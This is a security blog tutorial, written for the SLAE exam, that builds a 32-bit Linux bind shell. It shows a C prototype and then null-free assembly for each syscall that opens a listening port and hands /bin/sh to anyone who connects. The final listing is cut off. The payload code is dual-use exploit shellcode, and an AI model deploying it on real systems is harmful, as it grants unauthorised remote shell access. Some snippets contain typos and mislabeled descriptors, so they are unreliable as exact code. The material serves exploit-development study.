<!DOCTYPE html><html lang="en" mode="light" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Linux bind shell in assembly |</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Linux bind shell in assembly" /><meta name="author" content="Stipe Marinovic" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://smarinovic.github.io/posts/Bind-shell/" /><meta property="og:url" content="https://smarinovic.github.io/posts/Bind-shell/" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-23T01:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Linux bind shell in assembly" /><meta name="twitter:site" content="@stipemarinovic" /><meta name="twitter:creator" content="@Stipe Marinovic" /> <script type="application/ld+json"> {"@type":"BlogPosting","url":"https://smarinovic.github.io/posts/Bind-shell/","headline":"Linux bind shell in assembly","dateModified":"2020-05-23T01:00:00+02:00","datePublished":"2020-05-23T01:00:00+02:00","author":{"@type":"Person","name":"Stipe Marinovic"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://smarinovic.github.io/posts/Bind-shell/"},"description":"Introduction","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/commons/profil.jpg" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/"></a></div><div id="site-subtitle" class="font-italic">HTB writeups, OSCP, OSCE study resources</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/smarinovic" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/stipemarinovic" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="javascript:window.open('mailto:' + ['stipe.marinovic','protonmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" target="_blank"> <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Linux bind shell in assembly</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Linux bind shell in assembly</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, May 23, 2020, 1:00 AM +0200"> May 23, 2020 <i class="unloaded">2020-05-23T01:00:00+02:00</i> </span> by <span class="author"> Stipe Marinovic </span></div></div><div class="post-content"><h2 id="introduction">Introduction</h2><p>Objective of this blog post is to explain process of creating bind shell in assembly language for 32 bit Linux. Blog post was created for the SLAE certification exam and it describes process of creating both: bind shell and wrapper script which allows easy modification of bind shell’s listening port. Bind shell can simply be described as a piece of code which can be used to gain command execution (shell access) on target host. It is mostly used within payload sent to remote application which is vulnerable to buffer overflow.</p><h2 id="prototype">Prototype</h2><p>To get idea how bind shell works and which syscalls are used/needed, we can create prototype of bind shell code in C.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre>#define _GNU_SOURCE # added to avoid gcc's implicit declaration of function warning
#include &lt;unistd.h&gt; 
#include &lt;stdio.h&gt; 
#include &lt;sys/types.h&gt; 
#include &lt;sys/socket.h&gt; 
#include &lt;netinet/in.h&gt; 

int main() { 

  // Define struct containing bind() arguments
  struct sockaddr_in server; 

  // Define socket file descriptor
  int socketfd; 
  int socketid; 
   
  // Create socket 
  socketd = socket(AF_INET, SOCK_STREAM, 6); 

  // Setup struct "server" containing following information: address, port and address family
  server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
  server.sin_port = htons(4444);              // port 4444
  server.sin_family = AF_INET;                // address family (ip v4)

  // Bind socket to ip 0.0.0.0, port 4444 
  bind(socketd, (struct sockaddr*) &amp;server, sizeof(server)); 

  // Listen for incoming connections 
  listen(socketd, 2); 

  // Accept incoming connection 
  socketid = accept(socketd, NULL, NULL); 

  // Bind STDIN (0), STDOUT (1), STDERR (2) to incoming connection 
  dup2(socketid, 0); 
  dup2(socketid, 1); 
  dup2(socketid, 2); 

  // Run /bin/sh shell 
  execve("/bin/sh", NULL, NULL); 
} 
</pre></table></code></div></div><p>Once application is compiled (<code class="language-plaintext highlighter-rouge">with: gcc bind.c</code>) and run (<code class="language-plaintext highlighter-rouge">./a.out</code>), we can confirm with netstat (<code class="language-plaintext highlighter-rouge">netstat -antvp</code>) and netcat (<code class="language-plaintext highlighter-rouge">nc -v 127.0.0.1 4444</code>) that application is indeed listening at port 4444 and provides shell to whoever connects to listening port as shown on following screenshot. <img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00001.png" alt="bind shell" /></p><h2 id="syscalls">Syscalls</h2><p>Based on prototype code above, we can conclude that following syscalls are needed to implement bind shell:</p><ul><li>socket</li><li>bind</li><li>listen</li><li>accept</li><li>dup2</li><li>execve</li></ul><p>List of all syscalls and their associated numbers can be found in: unistd_32.h. On Kali 2019.4 linux file is located on following location:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/usr/include/x86_64-linux-gnu/asm/unistd_32.h
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>Syscall               Dec   Hex
----------------------------------
#define __NR_socket   359   0x167
#define __NR_bind     361   0x169
#define __NR_listen   363   0x16B
#define __NR_accept4  364   0x16C
#define __NR_dup2     63    0x3F
#define __NR_execve   11    0xB
</pre></table></code></div></div><p>Each syscall and its arguments are defined in man 2 pages in form of C function. In order to find out which arguments are needed we need to look at man pages. Based on man 2 pages for socket syscall (<code class="language-plaintext highlighter-rouge">man 2 socket</code>) we can see the three arguments that need to be passed to syscall.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>int socket(int domain, int type, int protocol);
</pre></table></code></div></div><p>socket() creates an endpoint for communication and returns a file descriptor that refers to that endpoint.<br /> The domain argument specifies a communication domain; this selects the protocol family which will be used for communication. These families are defined in &lt;sys/socket.h&gt;.<br /> The socket has the indicated type, which specifies the communication semantics.<br /> The protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.</p><p>Arguments are passed via registers in following order; EAX, EBX, ECX, EDX, ESI, EDI. EAX always contains syscall number (in case of socket it is decimal 359 or hex 0x167). The domain, type and protocol needs to be passed in EBX, ECX and EDX registers.</p><p>Assembly instruction: <code class="language-plaintext highlighter-rouge">MOV EAX, value</code> is used to move value to EAX register. Since shell code will most probably be used within exploit, payload cannot contain null byte as null byte (\x00) terminates string and break exploit. Playing with msf-nasm_shell.rb script which is available in Kali linux we can see that opcode for MOV EAX, 0x167 contains null bytes.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nasm &gt; mov eax, 0x167
00000000  B867010000        mov eax, 0x167
Null Bytes -----^^^^
</pre></table></code></div></div><p>To mitigate this issue, we need to find another way of placing 0x167 in EAX register. One way is to do this is to clear EAX register (set it to zero) and once EAX register is set to zero use MOV AX, 0x167 which refers to first 16 bit of EAX register. Opcode for such instruction does not contain null bytes as shown on following example:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nasm &gt; mov ax, 0x167
00000000  66B86701          mov ax, 0x167
nasm &gt; 
</pre></table></code></div></div><p>Once syscall number is placed in EAX register, we can continue with function arguments. If we look at prototype code:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>socket(AF_INET, SOCK_STREAM, 6);
</pre></table></code></div></div><p>Domain (AF_INET) is defined in: <code class="language-plaintext highlighter-rouge">/usr/include/x86_64-linux-gnu/bits/socket.h</code> as value “2” (PF_INET is the same as AF_INET):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/* Protocol families.  */
#define PF_INET         2       /* IP protocol family.  */
</pre></table></code></div></div><p>Type (SOCK_STREAM) is defined in <code class="language-plaintext highlighter-rouge">/usr/include/x86_64-linux-gnu/bits/socket_type.h</code> as value “1”</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>/* Types of sockets.  */
enum __socket_type
{
  SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
                                   of fixed maximum length.  */
</pre></table></code></div></div><p>Since moving values 1, 2 and 6 to EBX, ECX and EDX would generate null bytes as shown on following block code:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>nasm &gt; mov EBX, 0x2
00000000  BB02000000        mov ebx,0x2 
Null bytes ---^^^^^^
                                   
nasm &gt; mov ECX, 0x1
00000000  B901000000        mov ecx,0x1
Null bytes ---^^^^^^

nasm &gt; mov EDX, 0x6
00000000  BA06000000        mov edx,0x6 
Null bytes ---^^^^^^
</pre></table></code></div></div><p>similar to moving value to EAX register, we can move values to BL, CL and DL which represents first 8 bites of EBX, ECX and EDX registers. We couldn’t use MOV AL, 0x167 as 0x167 requires more than 8 bits so AX had to be used.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>nasm &gt; mov bl, 0x2
00000000  B302              mov bl,0x2
nasm &gt; mov cl, 0x1
00000000  B101              mov cl,0x1
nasm &gt; mov dl, 0x6
00000000  B206              mov dl,0x6
</pre></table></code></div></div><p>Before we can move any value to register we need to se registers to zero. The easiest way to do it without null bytes is to preform XOR operation on register.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>; Clearing registers
XOR EAX, EAX    ; set EAX to zero
XOR EBX, EBX    ; set EBX to zero
XOR ECX, ECX    ; set ECX to zero
XOR EDX, EDX    ; set EDX to zero
</pre></table></code></div></div><p>When registers are set to zero we can start writing assembly code to call socket syscall:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>MOV AX, 0x167  ; 0x167 is hex syscall to socket
MOV BL, 2      ; set domain argument
MOV CL, 1      ; set type argument
MOV DL, 6      ; set protocol argument
INT 0x80       ; interrupt

MOV EDI, EAX   ; as result of socket syscall descriptor is saved in EAX
               ; descriptor will be used with several other syscalls so
               ; we need to save it some how for later use. One way is
               ; to save it in EDI register which is least likely to be 
               ; used in following syscalls
</pre></table></code></div></div><p>Next step is to prepare registers for bind syscall. According to <code class="language-plaintext highlighter-rouge">man 2 bind</code>, bind takes 4 arguments.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
</pre></table></code></div></div><p>When a socket is created with socket(2), it exists in a name space (address family) but has no address assigned to it. bind() assigns the address specified by addr to the socket referred to by the file descriptor sockfd.<br /> addrlen specifies the size, in bytes, of the address structure pointed to by addr.</p><p>In a same way as for socket syscall we need to prepare data for bind bind syscall with exception that bind is using struct sockaddr which needs to be saved on the stack. In order to place some value on the stack PUSH instruction needs to be used. Since stack grows from higher addresses to lower addresses, last argument needs to be pushed first and due to little endian format values needs to be pushed in reverse order.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
server.sin_port = htons(4444);              // port 4444
server.sin_family = AF_INET;                // address family (ip v4)
</pre></table></code></div></div><p>There is also 4th parameter: sin_zero wish is always zero. So in order to push these values onto the stack we have to use push in following order:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
PUSH ECX         ; push zero_sin = 0 to the stack
PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
PUSH word 0x5c11 ; push hex 0x5c11 (dec 4444) in reverse order due to little endian
PUSH word 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
</pre></table></code></div></div><p>When struct is placed on the stack, ESP is pointing to the top of the stack, so we need to place address from ESP to ECX as address needs to be passed as 2nd argument to bind syscall. Once we have struct placed on the stack we can write assembly code for bind syscall.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
MOV EAX, 0x169   ; move bind syscall number in EAX register
MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
INT 0x80         ; interrupt
</pre></table></code></div></div><p>In the same way listen syscall can be written in assembly.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>int listen(int sockfd, int backlog);
</pre></table></code></div></div><p>listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2). The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET. The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.</p><p>From prototype code we can see backlog is set to 2: <code class="language-plaintext highlighter-rouge">listen(socketd, 2)</code> and sockfd is result of socket syscall currently located in EDI register.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>XOR EAX, EAX     ; set EAX to zero
MOV AX, 0x16B    ; move 0x16B to (E)AX
MOV EBX, EDI     ; move socket descriptor into EBX as first argument
MOV CL,  0x2     ; move "2" as backlog into ECX as second argument
INT 0x80         ; interrupt
</pre></table></code></div></div><p>Now when we have socket, bind and listen, next we need to accept connection. From <code class="language-plaintext highlighter-rouge">man 2 accept</code> we can see which arguments need to be passed to syscall.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
</pre></table></code></div></div><p>The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.<br /> The newly created socket is not in the listening state.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>XOR EAX, EAX     ; set EAX to zero for clean start
MOV AX, 0x16C    ; move accept syscall number (0x16C) in (E)AX
MOV EBX, EDI     ; move socket descriptor from EDI to EBX as first argument
XOR ECX, ECX     ; set ECX to zero as argument is NULL
XOR EDX, EDX     ; set EDX to zero as argument is NULL
XOR ESI, ESI     ; set flag to 0 by XOR-ing
INT 0x80         ; interrupt

XOR EDI, EDI     ; set EDI to zero
MOV EDI, EAX     ; As result, new socket descriptor will be saved in EAX 
                 ; so we can move it to EDI for further use.
</pre></table></code></div></div><p>Almost there.. next we need to call dup2 syscall with following arguments:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>int dup2(int oldfd, int newfd);
</pre></table></code></div></div><p>The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd. If the file descriptor newfd was previously open, it is silently closed before being reused.</p><p>Looking at prototype we can see that dup2() needs to be called three time, for STDIN (0), STOUT (2) and STDERR (3).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>dup2(socketid, 0);
dup2(socketid, 1);
dup2(socketid, 2);
</pre></table></code></div></div><p>To reduce shell code size, instad of manually goind thru each dup2 syscall, we can create a loop. ECX register will be used as counter but also as 2nd argument to dup2 syscall.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>MOV CL, 0x3     ; putting 3 in the counter
LOOP_DUP2:      ; loop label
XOR EAX, EAX    ; clear EAX
MOV AL, 0x3F    ; putting the syscall code in EAX
MOV EBX, EDI    ; putting our new socket descriptor in EBX
DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
INT 0x80        ; interrupt
JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set
</pre></table></code></div></div><p>And finaly execve syscall.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>int execve(const char *pathname, char *const argv[], char *const envp[]);
</pre></table></code></div></div><p>execve() executes the program referred to by pathname.<br /> This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments. pathname must be either a binary executable, or a script starting with a line of the form: <code class="language-plaintext highlighter-rouge">#!interpreter [optional-arg]</code>.</p><p>argv is an array of argument strings passed to the new program. By convention, the first of these strings (i.e., argv[0]) should contain the filename associated with the file being executed. envp is an array of strings, conventionally of the form key=value, which are passed as environment to the new program. The argv and envp arrays must each include a null pointer at the end of the array.</p><p>First we need to push values to the stack. Argv and envp need to have null pointer as well as path name must be null terminated. Since stack grovs from higher to lower memory address, first we need to push null byte and then “/bin/sh” in reverse order. Additional remark, since “/bin/sh” takes 7 bytes, we can add another slash to have 8 bytes “//bin/sh” and avoid null bytes. In order to push null byte to stack, we need to zero-out EAX and push it to stack:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>XOR EAX, EAX
PUSH EAX
</pre></table></code></div></div><p>After that, we need to push “//bin/sh”</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PUSH 0x68732f6E
PUSH 0x69622f2F
</pre></table></code></div></div><p>Then we need to place pointer to beginning of stack to EBX. ESP is pointing to the beginning of the stack and put null pointer by pushing EAX to the stack.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>MOV EBX, ESP
PUSH EAX
MOV EDX, ESP
</pre></table></code></div></div><p>ECX should point to the location of EBX so we can push EBX to the stack and move ESP which points to the top of the stack to EXC and finaly load execve syscall number to EAX (AL).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PUSH EBX
MOV ECX, ESP
MOV AL, 0x0Bž
INT 0x80
</pre></table></code></div></div><h2 id="bind-shell-code">Bind shell code</h2><p>So when we put it all together and add sections and entry point the result is following:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
</pre><td class="rouge-code"><pre>global _start

section .text
_start: 

        ; clear registers
        XOR EAX, EAX     ; set EAX to zero
        XOR EBX, EBX     ; set EBX to zero
        XOR ECX, ECX     ; set ECX to zero
        XOR EDX, EDX     ; set EDX to zero

        ; socket syscall
        MOV AX, 0x167    ; 0x167 is hex syscall to socket
